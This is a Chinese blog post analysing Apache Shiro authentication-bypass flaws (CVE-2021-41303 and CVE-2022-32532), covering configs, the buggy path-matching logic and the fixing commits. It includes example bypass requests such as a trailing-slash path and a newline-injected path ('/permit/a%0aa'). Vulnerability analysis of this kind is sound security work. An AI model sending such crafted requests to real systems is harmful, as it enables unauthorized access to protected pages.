+<p><img src="https://su18.org/post-images/1643108044903.png" alt="img"></p>
+<p>其实即使不报安全漏洞， shiro 也应该修复这个逻辑，因为 spring 本身可以支持以空格作为 RequestMapping。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643111008009.png" alt="img"></p>
+<p>而 shiro 对其处理逻辑则有问题，配置后访问将不生效。</p>
+<p><img src="https://su18.org/post-images/1643111002243.png" alt="img"></p>
+<p>如下：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643110977704.png" alt="img"></p>
+<h2 id="CVE-2021-41303"><a href="#CVE-2021-41303" class="headerlink" title="CVE-2021-41303"></a>CVE-2021-41303</h2><h3 id="漏洞信息-10"><a href="#漏洞信息-10" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41303">CVE-2021-41303</a> / <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-825">SHIRO-825</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.8.0</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Apache Shiro 与 Spring Boot 一起使用时，远程攻击者可以发送特制的 HTTP 请求， 绕过身份验证过程并获得对应用程序的未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | 回退 | /aaa/*/ | 绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left">[<a target="_blank" rel="noopener" href="https://threedr3am.github.io/]">https://threedr3am.github.io/]</a>(<a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro">https://threedr3am.github.io/2021/09/22/从源码diff分析Apache-Shiro</a> 1.7.1版本的auth bypass（CVE-2021-41303）/)</td>
+</tr>
+</tbody></table>
+<h3 id="漏洞详解-9"><a href="#漏洞详解-9" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>在上一个版本的更新中，除了安全修复，还更新了几个逻辑，来优化对路径末尾 &quot;/&quot; 的情况的处理。</p>
+<p>第一是匹配路径的方法 <code>PathMatchingFilter#pathsMatch</code>，在曾经 SHIRO-682 的更新中针对这个方法进行了修改，为了兼容 Spring 对访问路径最后一个 &quot;/&quot; 的支持。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643172673662.png" alt="img"></p>
+<p>在本次版本更新中，添加了一层判断逻辑，即先使用原始请求判断，如果没有匹配成功，再使用去掉 &quot;/&quot; 的路径尝试匹配。</p>
+<p>第二是在 <code>PathMatchingFilterChainResolver</code> 中新增了一个 <code>removeTrailingSlash</code> 方法，用来去除请求路径中的最后的 &quot;/&quot;。</p>
+<p><img src="https://su18.org/post-images/1643174895873.png" alt="img"></p>
+<p>并在 <code>getChain</code> 方法中更改逻辑，依旧是先使用原来的请求匹配，匹配不到再使用去除请求路径之后的 &quot;/&quot; 来匹配。</p>
+<p><img src="https://su18.org/post-images/1643174983680.png" alt="img"></p>
+<p>原本的逻辑是，拿到 URI ，直接判断最后是不是 “/”，如果是直接去掉，然后匹配和处理，但改过之后，直接拿过来匹配，如果没匹配到，再尝试去掉 “/” 在匹配，这种情况下，对于带 “/” 的请求将会匹配两次。</p>
+<p>不但逻辑复杂了，而且还写出了 BUG。在 else 语句块中，没有将 pathPattern 给到 <code>filterChainManager#proxy</code> 方法，反而是将用户可控的 requestURINoTrailingSlash 给了进去。</p>
+<p>这为什么会产生漏洞呢？这一切先从一个 BUG 说起：SHIRO-825。首先来复现一下这个 ISSUES ，我们配置如下，同样是使用单个 &quot;*&quot; 匹配:</p>
+<pre class="language-java" data-language="java"><code class="language-java">chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;list&quot;, &quot;authc&quot;);
+chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;*&quot;, &quot;anon&quot;);</code></pre>
+
+<p>可以看到，<code>/audit/</code> 路径下只有 list 是需要鉴权的，其他不需要。Controller 代码如下：</p>
+<pre class="language-java" data-language="java"><code class="language-java">@Controller
+@RequestMapping(value &#x3D; &quot;&#x2F;audit&quot;)
+public class AuditController &#123;
+
+
+	@GetMapping(value &#x3D; &quot;&#x2F;list&quot;)
+	public void list(HttpServletResponse response) throws IOException &#123;
+		response.getWriter().println(&quot;you have to be auditor to view this page&quot;);
+	&#125;
+
+
+	@GetMapping(value &#x3D; &quot;&#x2F;&#123;name&#125;&quot;)
+	public void list(@PathVariable String name, HttpServletResponse response) throws IOException &#123;
+		response.getWriter().println(&quot;no need auth to see this page:&quot; + name);
+	&#125;
+&#125;</code></pre>
+
+<p>此时访问 &quot;/audit/aaa&quot; 正常：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643179339365.png" alt="img"></p>
+<p>但是访问 &quot;/audit/aaa/&quot; 报错：</p>
+<p><img src="https://su18.org/post-images/1643179406759.png" alt="img"></p>
+<p>原因就是，shiro 会用处理过的用户请求路径去配置文件里找对应的路径，自然找不到就抛异常的。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643179722258.png" alt="img"></p>
+<p>那这个 BUG 是如何延伸成为漏洞的呢？不难想到，如果 shiro 在配置文件中找到了这个路径，那逻辑就正常了。我们再来配置一下场景，现在改为如下配置：</p>
+<pre class="language-java" data-language="java"><code class="language-java">chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;*&quot;, &quot;authc&quot;);
+chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;list&quot;, &quot;anon&quot;);</code></pre>
+
+<p>现在的逻辑是，配置了 <code>/audit/*</code> 需要认证，而 <code>/audit/list</code> 不需要认证，注意配置的顺序，正常逻辑下，对于 <code>/audit/list</code> 对应的路径，是需要鉴权的，因为他会被 <code>/audit/*</code> 匹配到，但是 <code>/audit/*</code> 不能匹配 <code>/audit/list/</code>，会去掉 &quot;/&quot; 进行匹配，能匹配到，且在后续的逻辑中也可以找到对应的路径，就可以绕过鉴权。</p>
+<p><img src="https://su18.org/post-images/1643181257015.png" alt="img"></p>
+<h3 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a> 中修复了此问题。可以看到修改后正确的传入了 pathPattern。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643176045349.png" alt="img"></p>
+<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>本漏洞的分析是参考了 threedr3am 师傅的博客，但存在几个疑问：</p>
+<ul>
+<li>本 CVE 在 CVSS 3.0 获得了 9.8 的评分，CVSS 2.0 获得了 7.5 的评分，但上面的漏洞场景似乎限制很大，给不到高危。</li>
+<li>ISSUES 的报送者是报送 BUG，并非安全风险，而官方的通告又致谢了另外一个安全从业者。</li>
+<li>我翻了所有的更新代码，确实没找到其他类似漏洞修复的地方，因为 shiro 一般修绕过的时候都会给出新的 testcase，确实没找到别的。</li>
+</ul>
+<h2 id="CVE-2022-32532"><a href="#CVE-2022-32532" class="headerlink" title="CVE-2022-32532"></a>CVE-2022-32532</h2><h3 id="漏洞信息-11"><a href="#漏洞信息-11" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32532">CVE-2022-32532</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.9.1</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">RegexRequestMatcher 在使用带有 &quot;.&quot; 的正则时，可能会导致权限绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">RegexRequestMatcher | . | 绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/4ra1n/CVE-2022-32532">CVE-2022-32532</a> <a target="_blank" rel="noopener" href="https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh">https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh</a> <a target="_blank" rel="noopener" href="https://tanzu.vmware.com/security/cve-2022-22978">https://tanzu.vmware.com/security/cve-2022-22978</a></td>
+</tr>
+</tbody></table>
+<h3 id="漏洞详解-10"><a href="#漏洞详解-10" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>此漏洞原理为 CVE-2022-22978 ，是当 RegexRequestMatcher 使用了 &quot;.&quot; 来进行正则匹配时，导致的权限绕过。Spring Security 报了一次，跑到 shiro 里再报一次，很合理。</p>
+<p>漏洞的成因很简单，就是 RegexRequestMatcher 默认使用的正则匹配的 &quot;.&quot; 不会匹配换行符，因此可以使用在路径中添加换行符来绕过权限匹配。这里不再重复漏洞原理，主要是正则的使用问题，简单复现一下。</p>
+<p>漏洞环境由漏洞报送者 4ra1n 师傅发布在 <a target="_blank" rel="noopener" href="https://github.com/4ra1n/CVE-2022-32532">github</a> 了，这里我们就使用他的环境。</p>
+<p>环境中将鉴权组件配置为了自定义的 <code>AccessControlFilter</code> 实现类，并将 PatternMatcher 配置为了 RegExPatternMatcher，在之前的 shiro CVE 中，我们都是使用 shiro 自己默认的 AntPathMatcher 的特性来绕过鉴权。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1656470418237.png" alt="img"></p>
+<p>而 <code>org.apache.shiro.util.RegExPatternMatcher</code> 是使用了 <code>Pattern.compile(pattern)</code> 来进行正则匹配。</p>
+<p><img src="https://su18.org/post-images/1656470507252.png" alt="img"></p>
+<p>然后将自定义的实现类配置在 SpringShiroFilter 中。</p>
+<p><img src="https://su18.org/post-images/1656470841496.png" alt="img"></p>
+<p>此时访问 <code>/permit/aa</code> 时，被正则匹配拦住：</p>
+<p><img src="https://su18.org/post-images/1656471971745.png" alt="img"></p>
+<p>访问 <code>/permit/a%0aa</code> 时，无法匹配到，绕过鉴权：</p>
+<p><img src="https://su18.org/post-images/1656472008605.png" alt="img"></p>
+<p>这中间差异性之前的漏洞也描述过了，不再重复。</p>
+<h3 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/6bcb92e06fa588b9c7790dd01bc02135d58d3f5b">Commit-6bcb92e</a> 中修复了此问题。可以看到为 RegexRequestMatcher 默认添加了 <code>Pattern.DOTALL</code> 选项，并同时添加了大小写敏感的选项。</p>
+<p><img src="https://su18.org/post-images/1656469745691.png" alt="img"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>能写(chao)完这篇文章首先很感谢su18师傅写的四篇关于shiro安全的博客，毕竟这东西要查重的话我的查重率估计在80%以上（</p>
+<p>另外对于shiro的漏洞，感觉看我之后只有两种漏洞，shiro550和路径解析问题导致的权限绕过（不过CVE-2014-0074好像不属于这两种，但是我也没看</p>
+<p>shiro550没什么好说的，很简单的链子，至于它的强化版shiro721在我看来漏洞利用实在是有点繁琐，不过GitHub似乎是有一键打的攻击。</p>
+<p>而对于路径解析的这些漏洞，多数是由于 shiro 的处理逻辑有误，或和中间件、其他框架的处理逻辑不一致导致的安全问题，通常对各种框架和中间件的版本要求都很严格。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Ethe</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Ethe448.github.io/2023/04/25/shiro%E5%AE%89%E5%85%A8/">https://Ethe448.github.io/2023/04/25/shiro%E5%AE%89%E5%85%A8/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Ethe</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">web学习</span>
+                                </a>
+                            
+                                <a href="/tags/java/">
+                                    <span class="chip bg-color">java</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("https://epicture.oss-cn-beijing.aliyuncs.com/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '9uxoX9BlIsmwlt8gNkGLF9Ow-gzGzoHsz',
+        appKey: 'rrsgRW80sgJP9PdFwFycskT9',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '8',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/04/27/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/8.jpg" class="responsive-img" alt="CommonsBeanutils反序列化">
+                        
+                        <span class="card-title">CommonsBeanutils反序列化</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Ethe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">反序列化</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/04/23/HDCTF2023-WP/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/18.jpg" class="responsive-img" alt="HDCTF2023 WP">
+                        
+                        <span class="card-title">HDCTF2023 WP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Ethe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/tocbot/tocbot.min.js"></script>
+<script>
+$(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
